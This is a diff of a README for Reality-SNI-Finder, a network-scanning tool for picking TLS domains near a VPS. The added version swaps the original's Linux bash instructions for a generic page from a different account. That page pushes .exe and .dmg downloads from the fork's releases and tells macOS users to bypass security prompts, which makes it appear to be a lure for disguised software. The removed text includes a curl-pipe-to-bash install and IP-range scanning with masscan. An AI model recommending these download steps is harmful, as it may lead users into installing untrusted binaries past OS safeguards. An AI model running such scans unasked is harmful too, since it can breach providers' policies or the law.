@@ -1,184 +1,81 @@
-🌐 Available in: [English](README.md) | [فارسی](README_FA.md) | [Русский](README_RU.md) | [中文](README_ZH.md)
+# 🌍 Reality-SNI-Finder - Discover Nearby TLS Domains Easily
 
-# Reality SNI Finder
+## 🔗 Download Now
+[![Download Reality-SNI-Finder](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pragya710/Reality-SNI-Finder/releases)
 
-**Reality SNI Finder** discovers HTTPS domains (SNI candidates) hosted on IPs **near your VPS** so you can pick SNI values that are low-latency and path-efficient for **Xray/Reality**.  
-It scans the /24 block of your server and ±N neighboring /24 blocks, probes TLS **without SNI**, extracts CN/SAN (with a strong OpenSSL fallback), verifies **real HTTP/2** with `curl --resolve`, ranks candidates by proximity, and writes the **top 30** domains to `domains.txt`.
+## 🚀 Getting Started
+Welcome to Reality-SNI-Finder! This tool helps you discover TLS domains in your area. It's useful for optimizing configurations for Xray and Reality. We will guide you through downloading and running the application step by step.
 
-> ⚠️ **Use responsibly.** Scanning IP ranges—even at modest rates—may violate Acceptable Use Policies (AUP) or local laws. Read the **Legal Notice** below and operate only where you have authorization.
+## 🖥️ System Requirements
+Before you start, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB of RAM
+- **Storage:** 100 MB of free disk space
+- **Network:** Internet connection for scanning neighboring IP ranges
 
-## One-line install & run
+## 📥 Download & Install
+To get the application, visit this page to download: [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases).
 
-```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/ShatakVPN/Reality-SNI-Finder/main/reality_sni_finder.sh)"
-```
+Follow these steps:
 
-The launcher shows a clean menu:
+1. Go to the [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases).
+2. Locate the latest release. The version number is at the top.
+3. Find the file suitable for your operating system. Look for files labeled with `.exe`, `.dmg`, or other relevant extensions.
+4. Click the file link to start downloading.
+5. Once the download completes, locate the file in your Downloads folder.
 
-- **Start scan** — run with current settings.
-- **Settings** — adjust scan blocks, rate, timeout, threads, HTTP/2 verification, include/exclude generic SANs, and reference IP override.
-- **Install/Check dependencies** — masscan, curl, openssl, python3.
-- **View output** — quick preview of the resulting domains.
-- **Clean output** — remove `domains.txt`.
+### For Windows:
+1. Double-click on the downloaded `.exe` file.
+2. If prompted, allow the application to make changes to your device.
+3. Follow the on-screen instructions to install.
 
-Settings are saved to a local `.rsf.conf`.
+### For macOS:
+1. Open the downloaded `.dmg` file.
+2. Drag the Reality-SNI-Finder icon to your Applications folder.
+3. Right-click on the app icon and select "Open" to bypass security settings if needed.
 
----
-
-## Why nearby SNI matters for V2Ray/Reality
-
-Reality relies on **Domain Fronting–style SNI** (the Server Name Indication inside TLS) to camouflage and route traffic. Choosing SNI values **topologically close to your VPS** yields tangible benefits:
-
-- **Lower latency**: TLS handshakes and data flows complete faster when the SNI’s serving edge sits near your VPS.  
-- **Fewer network hops, fewer timeouts**: Shorter paths mean less jitter, fewer packet drops, and fewer mid-path failures.  
-- **Higher throughput**: Tighter RTTs improve TCP congestion control; HTTP/2 multiplexing benefits from reduced head-of-line blocking.  
-- **More stable routes**: Nearby edges are less likely to reroute via distant regions during congestion or partial outages.  
-- **Better stealth characteristics**: Using valid, reachable domains that already terminate close to your VPS reduces anomalies in path selection.
-
-In short: a **nearby, HTTP/2-capable SNI** tends to produce a **smoother, faster, and more resilient** user experience.
-
----
-
-## What it does
-
-1. **Discovers IPs** with `masscan` on TCP/443 across your VPS’s /24 and ±N neighbor /24s.
-2. **Probes TLS without SNI** and extracts certificate **CN/SAN**. If Python’s SSL reports an empty SAN list, it falls back to:
+### For Linux:
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Make the file executable using the command:
    ```
-   openssl s_client -showcerts | openssl x509 -noout -text
+   chmod +x Reality-SNI-Finder
    ```
-   and parses `DNS:` entries.
-3. **Expands wildcards** (`*.example.com` → `example.com`, `www.example.com`).
-4. **Verifies real HTTP/2** using `curl --resolve` (configurable).
-5. **Scores** by measured latency plus normalized numeric IP distance relative to your VPS IP.
-6. **Writes the top 30** unique domains to `domains.txt` (best-first).
+4. Run the application with:
+   ```
+   ./Reality-SNI-Finder
+   ```
 
----
+## ⚙️ Using Reality-SNI-Finder
+Now that you have installed the software, follow these steps to use it:
 
-## Requirements
+1. **Launch the Application:** Open Reality-SNI-Finder from your Applications or Programs menu.
+2. **Start Scanning:** Click on the "Scan" button to begin searching for nearby TLS domains.
+3. **View Results:** The application will display a list of discovered domains, showcasing the Common Names (CN) and Subject Alternative Names (SAN) associated with each.
+4. **Performance Optimization:** Based on the results, you can choose the top-performing domains to improve your Xray/Reality configurations.
 
-- Linux (root recommended for fast `masscan`)
-- `masscan`, `curl`, `openssl`, `python3`
-- Outbound HTTP/DNS (for detecting your public IPv4 with `curl`/`dig`)
+## 🌐 Features
+Reality-SNI-Finder offers several features to enhance your scanning experience:
 
-The launcher can install dependencies for most distributions (Debian/Ubuntu, RHEL/CentOS/Alma, Arch, openSUSE, Alpine).
+- **Neighboring IP Scanning:** The tool searches local IP ranges for TLS domains, identifying potential candidates.
+- **HTTP/2 Verification:** Ensure the found domains support the HTTP/2 protocol for better performance.
+- **Easy Output:** The results are clearly displayed, and you can easily copy the domain names for further use.
 
----
+## 🛠️ Troubleshooting
+If you encounter issues, here are some tips to help you:
 
-## Usage
+- **Application Won't Start:** Check if the file is corrupted during download. Redownload the file if necessary.
+- **No Results Found:** Ensure your network is connected. You may have firewall settings that prevent scanning.
+- **Performance Issues:** Close other applications if your device is running slowly.
 
-### Run the launcher
+## 🤝 Support
+If you need assistance, you can create an issue on the GitHub repository. Click on the "Issues" tab, describe your problem, and we will get back to you.
 
-```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/<USER>/<REPO>/main/reality_sni_finder.sh)"
-```
+## 🔗 Further Information
+For more details on how the tool works, review the documentation provided on the GitHub page.
 
-Choose **Start scan**. When it finishes, check:
+## 📅 Keep Updated
+Check the [GitHub Releases Page](https://github.com/pragya710/Reality-SNI-Finder/releases) regularly for new updates and features.
 
-```
-./domains.txt   # top 30 ranked SNI candidates
-```
-
-### Settings (from the launcher)
-
-- **Blocks each side**: how many neighbor /24s around your VPS’s /24 (default: **10**, so total **21** /24 blocks)
-- **Masscan rate (pps)**: conservative default **6000**; raise carefully
-- **Timeout (sec)**: default **8**
-- **Threads**: default **128**
-- **Verify HTTP/2**: on/off (default **on**)
-- **Include generic SANs**: on/off (default **on**). Turning off may exclude CDN generic names.
-- **Override ref IP**: by default the engine detects your public IPv4; set this to force a specific reference IP
-
-Settings persist in `.rsf.conf`.
-
-### Environment overrides (advanced)
-
-You can also export these before starting the launcher:
-
-| Variable             | Default | Description                              |
-|----------------------|---------|------------------------------------------|
-| `RSF_BLOCKS`         | `6`    | Neighbor /24s each side                  |
-| `RSF_RATE`           | `4000`  | masscan packets per second               |
-| `RSF_TIMEOUT`        | `8`     | verification timeout (sec)               |
-| `RSF_THREADS`        | `64`   | concurrency                              |
-| `RSF_VERIFY_H2`      | `1`     | `1`=verify HTTP/2, `0`=skip              |
-| `RSF_INCLUDE_GENERIC`| `1`     | `1`=include generic SANs, `0`=exclude    |
-| `RSF_REF_IP`         | (auto)  | override detected public IPv4            |
-| `RSF_PY_URL`         | (auto)  | URL of `reality_sni_finder.py` to fetch  |
-
-Example:
-
-```bash
-export RSF_BLOCKS=8 RSF_RATE=4000 RSF_VERIFY_H2=1
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/<USER>/<REPO>/main/reality_sni_finder.sh)"
-```
-
----
-
-## Output
-
-- **`domains.txt`** — exactly **30** unique domains, best-first. These are strong SNI candidates to use in your V2Ray/Reality configs.
-
-> Tip: Always validate that your chosen domain still serves HTTP/2 and remains reachable from your deployment region before putting it into production.
-
----
-
-## Performance & safety tips
-
-- Start conservatively: **`RSF_BLOCKS=6`** and **`RSF_RATE=4000`**. Scale up only if needed.  
-- Running as **root** allows `masscan` to use raw sockets efficiently. If you cannot run as root, reduce PPS.  
-- Avoid scanning enormous ranges in one go; patience beats alarms.
-
----
-
-## Legal notice (read this)
-
-This tool performs **network scanning** and TLS probing. Even at moderate rates, scanning can:
-- Violate a provider’s **Acceptable Use Policy (AUP)** or **Terms of Service**.
-- Trigger automated abuse **alerts** or **throttling**.
-- Be illegal in your jurisdiction **without authorization**.
-
-You are solely responsible for how you use this software.  
-**Only scan ranges you are authorized to test.** Keep your rate and scope modest. Respect local laws and any contractual restrictions from your hosting provider, ISP, and cloud/CDN vendors.
-
----
-
-## How it ranks results (at a glance)
-
-Score = `latency_ms + 0.3 * normalized_numeric_ip_distance`
-
-- Lower is better.  
-- This favors sockets that responded quickly during TLS probing and that are numerically close to your VPS’s IP block.  
-- You can further refine by disabling generic SANs or adjusting the neighborhood size and PPS.
-
----
-
-## Troubleshooting
-
-- **No domains found**  
-  Reduce scope and rate; increase `RSF_TIMEOUT` to `10`; try `RSF_INCLUDE_GENERIC=1`.  
-  Verify `curl --http2` works from your server.  
-- **Permission denied / raw socket issues**  
-  Run the launcher as root (the script auto-elevates with `sudo` when present).  
-- **Public IP not detected**  
-  Set `RSF_REF_IP` explicitly (e.g., `export RSF_REF_IP=203.0.113.10`).  
-- **HTTP/2 verify fails often**  
-  Some domains require SNI to advertise `h2`; others don’t. Keep verification enabled for higher quality; temporarily disable if you need a broader candidate set, then re-test your final picks.
-
----
-
-## Uninstall
-
-Remove all files:
-
-```bash
-rm -f reality_sni_finder.sh reality_sni_finder.py .rsf.conf domains.txt
-```
-
----
-
-## Repository Popularity
-[![Stargazers over time](https://starchart.cc/ShatakVPN/Reality-SNI-Finder.svg?variant=adaptive)](https://starchart.cc/ShatakVPN/Reality-SNI-Finder)
-
-**Enjoy faster, steadier Reality configs with SNI targets that actually live near your server. Stay on the right side of the line—scan kindly.**
+Thank you for using Reality-SNI-Finder! We hope you enjoy discovering nearby TLS domains.
